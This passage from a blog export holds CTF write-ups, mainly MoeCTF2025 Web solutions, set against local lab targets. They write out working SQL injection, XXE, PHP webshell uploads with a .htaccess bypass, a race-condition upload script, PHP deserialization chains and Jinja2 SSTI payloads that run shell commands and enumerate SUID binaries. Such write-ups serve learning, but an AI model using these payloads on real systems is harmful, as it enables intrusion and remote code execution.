e.__traceback__.tb_frame.f_back builtins = frame.f_globals['__builtins__'] print(builtins.open('/tmp/flag.txt').read()) \"\"\" encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8') print(encoded) dHJ5OgogICAgcmFpc2UgRXhjZXB0aW9uKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgZnJhbWUgPSBlLl9fdHJhY2ViYWNrX18udGJfZnJhbWUuZl9iYWNrCiAgICBidWlsdGlucyA9IGZyYW1lLmZfZ2xvYmFsc1snX19idWlsdGluc19fJ10KICAgIHByaW50KGJ1aWx0aW5zLm9wZW4oJy90bXAvZmxhZy50eHQnKS5yZWFkKCkp moectf&#123;8e6909e8-7b9b-1c08-3131-46859e6830d9&#125; MoeCTF指导版 最近锤子太多了，都忙不过来了！！为了帮助大家更好地可以完成题目，fifker找到了一个好帮手…它可能有点…（？ 耄耋：拿到flag的方法都告诉你了，你二朵隆吗？？（哈 （这只是一个游戏，没有任何web知识点考察，也不需要任何web手段，千万不要使用，否则会影响游戏体验） （游戏加载需要一定时间） 查看源代码有助于做题。 第一关：精准投喂25个小鱼干，不然会触发114514 第二关：找信息即可241410173和241410156 第三关：文字游戏，密码分别是password 和incorrect! 第四关：复制发现隐藏的密钥xbhiuebkjvs 第五关：翻转后点击flag按钮凸了 moectf&#123;11738832-155d-3f7a-cc6b-95da7459659d&#125;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://saintcen.github.io/tags/CTF/"}]},{"title":"MoeCTF2025_Web_wp","slug":"MoeCTF2025_Web_wp","date":"2025-10-12T16:00:00.000Z","updated":"2025-10-15T16:43:52.652Z","comments":true,"path":"2025/10/13/MoeCTF2025_Web_wp/","permalink":"https://saintcen.github.io/2025/10/13/MoeCTF2025_Web_wp/","excerpt":"","text":"MoeCTF2025_Web_wp 不看小说做不出来也无妨 环境配置 浏览器：Firefox 工具：Burpsuite Hackbar dirsearch Ant-Sword CyberChef 代码环境：python/PHP/Javascript 0 Web入门指北 当比赛结束，回顾小说剧情的时候，你会发现主角一路修炼变强的荣耀，不也属于你吗？ F12打开控制台输入JSFuck代码即可。 moectf&#123;jv@vScr1p7_14_so0o0o0o_inT3r3&amp;t!!!&#125; 01 第一章 神秘的手镯 【万载尘封，灵犀方启。欲窥玄机，需诵‘启封咒’。】 不让复制，只需控制台禁用JS，然后再打开。 Microsoft Edge：Ctrl+Shift+I Ctrl+Shift+P，输入JavaScript Firefox：网址栏输入about:config，找到javascript.enabled moectf&#123;f_i2_1s_Your_g00d_fri3nd!!&#125; 另：查看前端源代码即可发现flag 01 第一章 神秘的手镯_revenge 相传，大名鼎鼎的金曦破妄真君——HDdss从微末中来，偶然中通过劫烬重明天尊——K皇的手镯与其相识并拜K皇为师。后来在K皇帮助HD修行，而HD帮助K皇重塑肉身，二人双双飞升成仙，如今不知去向…… 提示备份，我们在URL后添加/wanyanzhou.txt.bak，得到了密码。 下面只需输入500次，查看一下JS源代码再编写爆破脚本。 (async()=>&#123; const PASSWORD=\"REPLACE_WITH_PASSWORD\"; const ITERS=500; const ta=document.getElementById(\"passwordInput\"); const btn=document.getElementById(\"unsealButton\"); const desc=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,\"value\"); Object.defineProperty(ta,\"value\",&#123; configurable:true, enumerable:desc.enumerable, get:function()&#123;return desc.get.call(this);&#125;, set:function(v)&#123; if(v===\"\") return; return desc.set.call(this,v); &#125; &#125;); for(let i=0;i&lt;ITERS;i++)&#123; ta.value=PASSWORD; ta.dispatchEvent(new Event(\"input\",&#123;bubbles:true&#125;)); btn.click(); await new Promise(r=>setTimeout(r,60)); &#125; delete ta.value; Object.defineProperty(ta,\"value\",desc); &#125;)(); moectf&#123;0a7c8efd-86a7-5531-adf0-c673352e474b&#125; 02 第二章 初识金曦玄轨 “此乃老夫模拟宗门常见的‘天赋初测禁制’所设。”K皇道，“其表象华丽，内藏乾坤。真言（Flag）便藏于其玄轨本源之中。你且运转罗盘，以‘窥天之桥’探查此光幕本源，找出真言！” 提示用8080端口代理。 # curl -x http://127.0.0.1:8080 http://127.0.0.1:11023/ &lt;!DOCTYPE html> &lt;html lang=\"zh\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;title>金曦禁制·初阶试炼&lt;/title> &lt;link href=\"https://fonts.googleapis.com/css2?family=Ma+Shan+Zheng&amp;display=swap\" rel=\"stylesheet\"> &lt;link rel=\"stylesheet\" href=\"/static/css/style.css\"> &lt;/head> &lt;body> &lt;div class=\"ink-bg\">&lt;/div> &lt;div class=\"scroll-container\"> &lt;div class=\"scroll-content\"> &lt;h1>【金曦禁制·初阶试炼】&lt;/h1> &lt;div class=\"talisman-card\"> &lt;blockquote> \"金曦禁制乃宗门秘传，非神识敏锐者不可窥其真形。\" &lt;br>&lt;br> &lt;span class=\"blur-text\">前往/golden_trail看看&lt;/span> &lt;/blockquote> &lt;/div> &lt;div class=\"spell-code\"> &lt;div class=\"spell-header\">古籍残卷&lt;/div> &lt;p class=\"obscured\">此处文字被岁月侵蚀模糊难辨...只能辨认几个字...破阵...盘？&lt;/p> &lt;/div> &lt;/div> &lt;/div> &lt;div class=\"sword\">&lt;/div> &lt;div id=\"aura-particles\">&lt;/div> &lt;script src=\"/static/js/effects.js\">&lt;/script> &lt;/body> &lt;/html> 根据提示，我们前往/golden_trail，查看响应头。 moectf&#123;0bs3rv3_Th3_Gold3n_traiL&#125; 03 第三章 问剑石！篡天改命！ 仙门试炼台中央矗立着玄天剑宗至宝”问剑石”，石身流转着七彩霞光。你作为新晋弟子需测试天赋，但暗中知晓问剑石运作的玄机——其天赋判定实则通过金曦玄轨传递信息。 bp抓包后按题目要求修改重新post即可。 moectf&#123;gEt-P0sT-TR@Nsm15510N_15-@-g00D_meTHoDll!3c&#125; 04 第四章 金曦破禁与七绝傀儡阵 眼前景象变换，已身处一座巨大的地下石殿之中。殿内光线昏暗，唯有七尊造型各异、散发着冰冷金属光泽的巨大傀儡，如同沉睡的巨兽，分别矗立在七个方位。空气弥漫着压抑的灵压和机括运转的低沉嗡鸣。 此题考察http请求，完成每个任务后收集玉简拼接。 GET ?key&#x3D;xdsec # bW9lY3Rme0Mw POST curl -X POST -d &quot;declaration&#x3D;织云阁&#x3D;第一&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;cloud_weaver # bjZyNDd1MTQ3 本地访问 curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;shadow_stalker # MTBuNV95MHVy 浏览器 curl -H &quot;User-Agent: moe browser&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;soul_discerner # X2g3N1BfbDN2 身份认证 curl -H &quot;Cookie: user&#x3D;xt&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;heart_seal # M2xfMTVfcjM0 Referer curl -H &quot;Referer: http:&#x2F;&#x2F;panshi&#x2F;entry&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;pathfinder # bGx5X2gxOWgh PUT curl -X PUT http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;void_rebirth -H &quot;Content-Type: text&#x2F;plain&quot; -d &quot;新生！&quot; # fQ&#x3D;&#x3D; base64解码后得到： moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!&#125; 05 第五章 打上门来！ 汝不过侥幸得势之鄙夫，安敢窃据S级之位，与吾horrible并列？徒惹人笑！可敢于三日之后，午时三刻，斗法台上一决高下？届时，当众碾碎汝之虚名，令汝知晓何谓云泥之别！——天衍阁·horrible 敕令！ 可以自由查看网页文件，提示的“文件穿梭技法”即为../，我们输入../../看到了flag文件。 moectf&#123;@ll-1NpuT-ls_M4L1ClOUs4d84c9a3&#125; 06 第六章 藏经禁制？玄机初探！ “九重玄机锁…”K皇沉吟，“此乃’天衍真言术’的入门考验！所谓玄机禁制，实则是以特殊’真言’构筑的规则牢笼——在凡俗界，称之为’数据库’；其破解之道，名为’注入之术’！” 典型的sql注入，用万能密码即可（不过要先查看一下传递的参数）。 http:&#x2F;&#x2F;127.0.0.1:20322&#x2F;?username&#x3D;&amp;password&#x3D;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39; -- moectf&#123;wEICom3_to_sq1-1NJECTloN!l12a9c353&#125; 07 第七章 灵蛛探穴与阴阳双生符 “此乃守阁傀儡布下的警戒网。”K皇提醒，“专捕钻洞宵小。需以’灵蛛探穴术’与其共鸣，方可通过。” 查看/robots.txt，包含爬虫信息。 User-agent: * Disallow: &#x2F;flag.php 访问flag.php，需要php代码审计。 &lt;?php highlight_file(__FILE__); $flag = getenv('FLAG'); $a = $_GET[\"a\"] ?? \"\"; $b = $_GET[\"b\"] ?? \"\"; if($a == $b)&#123; die(\"error 1\"); &#125; if(md5($a) != md5($b))&#123; die(\"error 2\"); &#125; echo $flag; 代码中使用的是!=（松散比较），而不是!==（严格比较）。在PHP中，松散比较会进行类型转换。我们可以利用这一点，传递两个字符串，它们不是有效的MD5哈希，但被松散比较认为是相等的。 构造payload： http:&#x2F;&#x2F;127.0.0.1:56727&#x2F;flag.php?a&#x3D;QNKCDZO&amp;b&#x3D;240610708 moectf&#123;md5_IS-not_SAfE1l1d8750fde52&#125; 08 第八章 天衍真言，星图显圣 葬星古墟开启前夜，玄机阁底暗流涌动。HDdss以龟息诀化形为顽石，在无相玄光中潜行如影。当他穿过千机岩的密道，眼前的景象令他呼吸一滞——万卷廊并非凡间书阁，而是一片浩瀚星海！十万玉简如星辰流转，在九重天宇间循玄奥轨迹运行。 union注入，有固定的做题板子。 以mysql为例，它有固定的数据库information_schema储存表的信息。 先确定列数（需要占位）。 &#x2F;?username&#x3D;admin ORDER BY 2 -- &amp;password&#x3D;123 再查数据库（列数为2）。 &#x2F;?username&#x3D;&#39; union select database(),1 -- &amp;password&#x3D;123 再查表名（数据库叫user）。 &#x2F;?username&#x3D;&#39; union select (select table_name from information_schema.tables where table_schema&#x3D;&#39;user&#39; limit 0,1),1 -- &amp;password&#x3D;123 再查字段（表名为flag）。 &#x2F;?username&#x3D;&#39; union select (select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;user&#39; and table_name&#x3D;&#39;users&#39;),1 -- &amp;password&#x3D;123 &#x2F;?username&#x3D;&#39; union select (select value from user.flag),1 -- &amp;password&#x3D;123 moectf&#123;UnlOn-BA5Ed_SqII-fTw1l124520155&#125; 09 第九章 星墟禁制·天机问路 【星墟真名关】 虚空星域皆有名，真名隐于天机链。 欲入墟眼护重宝，且向玄鉴问幽玄！ ———输入星域真名，解析天机锁链 发现参数中包含URL，尝试下参数注入。 http:&#x2F;&#x2F;127.0.0.1:62026&#x2F;?url&#x3D;&#39;&#39;;env moectf&#123;99f51414-4d1b-2df7-66bf-f5cd6765e858&#125; 10 第十章 天机符阵 「星殒禁域·启！」 非预期解，正解在revenge中。 URL后添加/flag.txt即可。 moectf&#123;G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l&#125; 10 第十章 天机符阵_revenge flag在flag.txt里面 提示了xxe漏洞。 &lt;阵枢&gt;引魂玉&lt;&#x2F;阵枢&gt; &lt;解析&gt;未定义&lt;&#x2F;解析&gt; &lt;输出&gt;未定义&lt;&#x2F;输出&gt; &lt;!DOCTYPE 契约 [ &lt;!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]> &lt;root> &lt;阵枢>引魂玉&lt;/阵枢> &lt;解析>&amp;xxe;&lt;/解析> &lt;输出>守玉人残魂&lt;/输出> &lt;/root> moectf&#123;b36161fc-07ae-4cc9-0bda-3673f258ab01&#125; 11 第十一章 千机变·破妄之眼 HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入。 查看一下源代码，我们直接在控制台按提示要求爆破。 function* permutations(arr, n = arr.length) &#123; if (n === 1) yield arr.slice(); else for (let i = 0; i &lt; n; i++) &#123; yield* permutations(arr, n - 1); [arr[n % 2 ? 0 : i], arr[n - 1]] = [arr[n - 1], arr[n % 2 ? 0 : i]]; &#125; &#125; async function bruteForce() &#123; const chars = ['m', 'n', 'o', 'p', 'q']; const targetUrl = window.location.origin + window.location.pathname; for (const param of permutations(chars)) &#123; const paramStr = param.join(''); const response = await fetch(`$&#123;targetUrl&#125;?$&#123;paramStr&#125;=$&#123;paramStr&#125;`, &#123; credentials: 'include', headers: &#123;'X-Requested-With': 'XMLHttpRequest'&#125; &#125;); await new Promise(resolve => setTimeout(resolve, 300)); &#125; &#125; bruteForce(); 发现flag.php，说flag就在这里。还有一个find.php文件，尝试下文件包含。 &#x2F;find.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php 用base64解码，flag在php代码注释里。 moectf&#123;84fd1e75-647c-3aa4-82b8-1cba2dc45347&#125; 12 第十二章 玉魄玄关·破妄 「吾乃玉魄初主玄微子。后世得见吾之传承者，需破四玄关。」 「首关‘破妄’——勘破虚妄，直抵本真。」 &lt;?php highlight_file(__FILE__); @eval($_POST['cmd']); 用蚁剑连接，根目录打开终端输入env。 moectf&#123;ff560111-86ab-ec12-dee6-084f8d577fb5&#125; 13 第十三章 通幽关·灵纹诡影 「此关禁绝残魂」 玄微子的声音从齿轮深处传来，「魔气擅噬神魂，汝需独力破局」 「任务：」 【清秽】净化玉魄核心 【绘真】上传修复灵纹 题目已经提示了文件头绕过FFD8FF。 构造一句话木马1.php，并用01editor修改文件头。 &lt;?=eval($_POST['cmd']);?> 上传后用蚁剑连接http://127.0.0.1:53111/uploads/1.php，根目录打开终端输入env。 moectf&#123;63f59f3f-1a5e-fa6a-782d-58a02b7b3440&#125; 14 第十四章 御神关·补天玉碑 御神关任务： 【补天】修复守护玉碑 【斩魔】激活玉碑镇压魔心 系统过滤php文件，提示是apache服务器，我们可以伪装成配置文件.htaccess。 &lt;Files &quot;payload&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;Files&gt; 这个文件会把payload文件作为php文件执行。上传一句话木马，文件名为payload，不需要后缀。 &lt;?php eval($_POST['cmd']); ?> 用蚁剑连接，检查根目录文件发现flag。 moectf&#123;e85c55a3-1c51-b895-1129-cf7737bca98a&#125; 还可以关注一下.user.ini以及图片马的用法。 15 第十五章 归真关·竞时净魔 「魔心秽血已污染玉魄九成…归真关乃最后机缘…若败…万物皆灭…」 浅析条件竞争漏洞_竞争条件漏洞-CSDN博客 文件上传弄了好久，还是注意审题，应该是条件竞争。bp不装插件不能多线程，所以我们用py。 import requests from concurrent.futures import ThreadPoolExecutor upload_url = \"http://127.0.0.1:23722/\" shell_url = \"http://127.0.0.1:23722/uploads/shell.php\" def race_condition_attack(_): files = &#123; \"upload_file\": ( \"shell.php\", \"&lt;?php fputs(fopen('pass.php','w'),'&lt;?php phpinfo();?>');?>\", ) &#125; data = &#123;\"submit\": \"上传\"&#125; requests.post(upload_url, data=data, files=files, timeout=3) r = requests.get(shell_url, timeout=3) if r.status_code == 200: print(\"[+] 上传成功！Shell 已存在:\", shell_url) if __name__ == \"__main__\": with ThreadPoolExecutor(20) as pool: pool.map(race_condition_attack, range(200)) moectf&#123;70c57075-0bc1-245e-03cc-3f77007a2b06&#125; 16 第十六章 昆仑星途 玄天剑宗的庆功宴设在破碎天穹之下。葬星古墟的悬棺第一次不再是死亡的象征，而是化作漫天星灯，守玉人静立虚空，以身为烛，照亮这场跨越生死的盛宴。 &lt;?php error_reporting(0); highlight_file(__FILE__); include($_GET['file'] . \".php\"); 传递file参数会在前端展示内容，需要绕过.php，发现allow_url_include = On，flag文件名为随机30个数字字母（flag-xxxx）。我们利用文件包含原理，并用#注释掉URL中后续的参数以绕过检测。 http:&#x2F;&#x2F;127.0.0.1:65009&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat &#x2F;flag-*&#39;);?&gt;# moectf&#123;3b6a1b51-3a4a-559b-4452-0cba9e8f1bd5&#125; 17 第十七章 星骸迷阵·神念重构 脚下并非实地，而是悬浮的青铜齿轮，大的如山脉横亘，小的似微尘浮游。齿轮咬合处迸发着数据流光，在虚空中交织成无尽迴路。远处有破碎的殿宇倒悬，廊柱间缠绕着发光藤蔓——细看竟是具象化的代码流！ &lt;?php highlight_file(__FILE__); class A &#123; public $a; function __destruct() &#123; eval($this->a); &#125; &#125; if(isset($_GET['a'])) &#123; unserialize($_GET['a']); &#125; http:&#x2F;&#x2F;127.0.0.1:54364&#x2F;?a&#x3D;O:1:%22A%22:1:&#123;s:1:%22a%22;s:10:%22phpinfo();%22;&#125; 在phpinfo()的env里找到了flag。 moectf&#123;cc0c2fc5-8ec3-ed9b-2741-e826d5207b5f&#125; 18 第十八章 万卷诡阁·功法连环 黑猫挥出的数据风暴将三人卷入一座无尽书阁。檀木书架高耸入云，其上玉简如星河铺展，每一卷都流淌着大道符文。阁中央悬浮着墨玉棋局，三百六十一枚棋子皆由压缩的功法代码凝成。 &lt;?php highlight_file(__FILE__); class PersonA &#123; private $name; function __wakeup() &#123; $name=$this->name; $name->work(); &#125; &#125; class PersonB &#123; public $name; function work()&#123; $name=$this->name; eval($name); &#125; &#125; if(isset($_GET['person'])) &#123; unserialize($_GET['person']); &#125; http:&#x2F;&#x2F;127.0.0.1:54605&#x2F;?person&#x3D;O:7:&quot;PersonA&quot;:1:&#123;s:13:&quot;%00PersonA%00name&quot;;O:7:&quot;PersonB&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 在phpinfo()的env里找到了flag。 moectf&#123;77f0400b-f11a-812b-e1a4-78d0f2627b5d&#125; 19 第十九章 星穹真相·补天归源 空间裂缝闭合的刹那，三人坠入一片混沌星穹。这里没有天地之分，只有无数破碎的镜面悬浮流转，每一面镜子都映照出不同的时空片段——有玄天剑宗的庆功宴，有葬星古墟的惨战，甚至还有HDdss幼时在赵家偏院练剑的青涩模样。 &lt;?php highlight_file(__FILE__); class Person &#123; public $name; public $id; public $age; public function __invoke($id) &#123; $name = $this->id; $name->name = $id; $name->age = $this->name; &#125; &#125; class PersonA extends Person &#123; public function __destruct() &#123; $name = $this->name; $id = $this->id; $age = $this->age; $name->$id($age); &#125; &#125; class PersonB extends Person &#123; public function __set($key, $value) &#123; $this->name = $value; &#125; &#125; class PersonC extends Person &#123; public function __Check($age) &#123; if(str_contains($this->age . $this->name,\"flag\")) &#123; die(\"Hacker!\"); &#125; $name = $this->name; $name($age); &#125; public function __wakeup() &#123; $age = $this->age; $name = $this->id; $name->age = $age; $name($this); &#125; &#125; if(isset($_GET['person'])) &#123; $person = unserialize($_GET['person']); &#125; http:&#x2F;&#x2F;127.0.0.1:65309&#x2F;?person&#x3D;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:2:&quot;id&quot;;s:2:&quot;xx&quot;;s:3:&quot;age&quot;;s:2:&quot;xx&quot;;&#125;s:2:&quot;id&quot;;s:7:&quot;__Check&quot;;s:3:&quot;age&quot;;s:7:&quot;cat &#x2F;f*&quot;;&#125; moectf&#123;b9c0db89-853c-52fd-c779-ffe5bc66a127&#125; 19 第十九章_revenge 第十九章的revenge &lt;?php highlight_file(__FILE__); class Person &#123; public $name; public $id; public $age; &#125; class PersonA extends Person &#123; public function __destruct() &#123; $name = $this->name; $id = $this->id; $name->$id($this->age); &#125; &#125; class PersonB extends Person &#123; public function __set($key, $value) &#123; $this->name = $value; &#125; public function __invoke($id) &#123; $name = $this->id; $name->name = $id; $name->age = $this->name; &#125; &#125; class PersonC extends Person &#123; public function check($age) &#123; $name=$this->name; if($age == null) &#123; die(\"Age can't be empty.\"); &#125; else if($name === \"system\") &#123; die(\"Hacker!\"); &#125; else &#123; var_dump($name($age)); &#125; &#125; public function __wakeup() &#123; $name = $this->id; $name->age = $this->age; $name($this); &#125; &#125; if(isset($_GET['person'])) &#123; $person = unserialize($_GET['person']); &#125; http:&#x2F;&#x2F;127.0.0.1:56672&#x2F;?person&#x3D;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;exec&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonB&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;any&quot;;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;N;&#125;s:3:&quot;age&quot;;N;&#125;s:3:&quot;age&quot;;s:3:&quot;xxx&quot;;&#125;s:2:&quot;id&quot;;s:5:&quot;check&quot;;s:3:&quot;age&quot;;s:3:&quot;env&quot;;&#125; moectf&#123;de439502-db1f-64b9-f661-a7900923048e&#125; 20 第二十章 幽冥血海·幻语心魔 断笛中爆出血雾，在空中交织成诡异符阵。另外两名魔修同时喷出本命精血，嘶声吟唱： “以血为媒，以言为咒——幻语心魔阵，启！” from flask import Flask, request, render_template, render_template_string app = Flask(__name__) @app.route('/') def index(): if 'username' in request.args or 'password' in request.args: username = request.args.get('username', '') password = request.args.get('password', '') if not username or not password: login_msg = \"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-fail'>用户名或密码不能为空&lt;/div>&lt;/div> &lt;/div> \"\"\" else: login_msg = render_template_string(f\"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-success'>欢迎: &#123;username&#125;&lt;/div>&lt;/div> &lt;/div> \"\"\") else: login_msg = \"\" return render_template(\"index.html\", login_msg=login_msg) if __name__ == '__main__': app.run(host='0.0.0.0', port=80) http:&#x2F;&#x2F;127.0.0.1:40563&#x2F;?username&#x3D;&#123;&#123;cycler.__init__.__globals__[&#39;os&#39;].popen(&#39;env&#39;).read()&#125;&#125;&amp;password&#x3D;1 moectf&#123;02941eab-7adb-d9d0-69bc-4a2dc9086bfa&#125; 21 第二十一章 往生漩涡·言灵死局 往生漩涡的边缘，血浪滔天。万魂幡摇动间，无数怨魂从漩涡中爬出，化作实体化的血色魔兵。为首魔修身高丈二，血袍上绣着九颗噬心图案——正是噬心魔宗九心长老！ from flask import Flask, request, render_template, render_template_string app = Flask(__name__) blacklist = [\"__\", \"global\", \"&#123;&#123;\", \"&#125;&#125;\"] @app.route('/') def index(): if 'username' in request.args or 'password' in request.args: username = request.args.get('username', '') password = request.args.get('password', '') if not username or not password: login_msg = \"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-fail'>用户名或密码不能为空&lt;/div>&lt;/div> &lt;/div> \"\"\" else: login_msg = render_template_string(f\"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-success'>欢迎：&#123;username&#125;&lt;/div>&lt;/div> &lt;/div> \"\"\") for blk in blacklist: if blk in username: login_msg = \"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-fail'>Error&lt;/div>&lt;/div> &lt;/div> \"\"\" else: login_msg = \"\" return render_template(\"index.html\", login_msg=login_msg) if __name__ == '__main__': app.run(host='0.0.0.0', port=80) http:&#x2F;&#x2F;127.0.0.1:1378&#x2F;?username&#x3D;&#123;% set du&#x3D;&#39;_&#39;~&#39;_&#39; %&#125;&#123;% set gi&#x3D;du~&#39;getitem&#39;~du %&#125;&#123;% set bk&#x3D;du~&#39;builtins&#39;~du %&#125;&#123;% set ik&#x3D;du~&#39;import&#39;~du %&#125;&#123;% set nk&#x3D;du~&#39;name&#39;~du %&#125;&#123;% set sc&#x3D;&#39;&#39;|attr(du~&#39;class&#39;~du)|attr(du~&#39;mro&#39;~du)|attr(gi)(-1)|attr(du~&#39;subclasses&#39;~du)() %&#125;&#123;% for c in sc %&#125;&#123;% if c|attr(nk)&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;% set w&#x3D;c() %&#125;&#123;% set m&#x3D;w|attr(&#39;_module&#39;) %&#125;&#123;% set md&#x3D;m|attr(du~&#39;dict&#39;~du) %&#125;&#123;% set b&#x3D;md|attr(gi)(bk) %&#125;&#123;% set imp&#x3D;b|attr(gi)(ik) %&#125;&#123;% set os&#x3D;imp(&#39;os&#39;) %&#125;&#123;% set envs&#x3D;os|attr(&#39;popen&#39;)(&#39;env&#39;)|attr(&#39;read&#39;)() %&#125;&lt;pre&gt;&#123;% print(envs) %&#125;&lt;&#x2F;pre&gt;&#123;% endif %&#125;&#123;% endfor %&#125;&amp;password&#x3D;1 moectf&#123;b603bff7-2595-9703-5449-640a7b6fea44&#125; 22 第二十二章 血海核心·千年手段 漩涡深处竟是别有洞天。一座由白骨堆砌的宫殿矗立在血海核心，殿门笼罩着血色光幕，上面流转着比言灵死局更复杂的符文。 from flask import Flask, request, render_template, render_template_string app = Flask(__name__) @app.route('/') def index(): if 'username' in request.args or 'password' in request.args: username = request.args.get('username', '') password = request.args.get('password', '') if not username or not password: login_msg = \"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-fail'>用户名或密码不能为空&lt;/div>&lt;/div> &lt;/div> \"\"\" else: login_msg = f\"\"\" &lt;div class=\"login-result\" id=\"result\"> &lt;div class=\"result-title\">阵法反馈&lt;/div> &lt;div id=\"result-content\">&lt;div class='login-success'>Welcome: &#123;username&#125;&lt;/div>&lt;/div> &lt;/div> \"\"\" render_template_string(login_msg) else: login_msg = \"\" return render_template(\"index.html\", login_msg=login_msg) if __name__ == '__main__': app.run(host='0.0.0.0', port=80) jinjia2无回显SSTI - colorfullbz - 博客园 http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;dir.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;dir ..&#x2F;&#39;).read() ) &#125;&#125;&amp;password&#x3D;1 http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;static&#x2F;dir.txt app boot entrypoint.sh flag lib media opt root sbin sys usr bin dev etc home lib64 mnt proc run srv tmp var http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;flag.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat ..&#x2F;flag&#39;).read() ) &#125;&#125;&amp;password&#x3D;1 http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;static&#x2F;flag.txt 发现了flag无法读取，必须想办法绕过权限问题。试试SUID。 http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;suid.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null&#39;).read() ) &#125;&#125;&amp;password&#x3D;1 http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;static&#x2F;suid.txt &#x2F;usr&#x2F;bin&#x2F;rev &#x2F;usr&#x2F;bin&#x2F;mount &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;su &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;umount &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;sudo 逆向检查一下/rev。 http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;main_disassembly.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;objdump -d &#x2F;usr&#x2F;bin&#x2F;rev | grep -A 30 main&#39;).read() ) &#125;&#125;&amp;password&#x3D;1 http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;static&#x2F;main_disassembly.txt 1175: 48 8b 00 mov (%rax),%rax 1178: 48 89 c6 mov %rax,%rsi 这里，程序把输入的第一个参数（比如 ssdDH--）放到了 %rsi 寄存器里，准备进行比较。 117b: 48 8d 05 82 0e 00 00 lea 0xe82(%rip),%rax # 2004 &lt;_IO_stdin_used+0x4&gt; 1182: 48 89 c7 mov %rax,%rdi 程序从内存地址 0x2004 